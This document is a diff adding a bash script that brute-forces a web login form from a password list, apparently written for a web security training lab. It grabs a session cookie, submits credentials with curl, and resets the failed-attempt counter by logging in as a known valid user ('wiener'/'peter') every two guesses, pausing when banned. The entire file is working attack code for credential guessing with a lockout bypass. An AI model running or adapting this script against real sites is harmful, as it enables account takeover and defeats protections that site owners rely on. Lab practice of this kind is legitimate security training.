@@ -1,0 +1,43 @@
+#!/usr/bin/bash
+
+username=$1
+passwords_file=$2
+url=$3
+threads=10
+
+flag="password"
+rm -f "$flag"
+
+login() {
+	curl -s -o $5 -X POST -d "username=$1&password=$2" -b "session=$4" $3
+}
+
+get_session() {
+	curl -s -i $1 | grep "session" | cut -d "=" -f 2 | cut -d ";" -f 1
+}
+
+session=$(get_session "$url")
+echo "$session"
+attempts=0
+while read -r pass; do
+	echo "$attempts"
+	while true; do
+		if [ $attempts -gt 1 ]; then
+			login "wiener" "peter" "$url" "$session" "response"
+			attempts=0
+		fi
+		login "$username" "$pass" "$url" "$session" "response"
+		if cat response | grep "too many"; then
+			echo "[!] Banned"
+			sleep 60
+			break
+		fi
+		if cat response | grep "Invalid"; then
+			echo "[*] Incorrect: $pass"
+			attempts=$(( attempts + 1 ))
+			break
+		fi
+		echo "[!] Found: $pass"
+		break 2
+	done
+done < "$passwords_file"
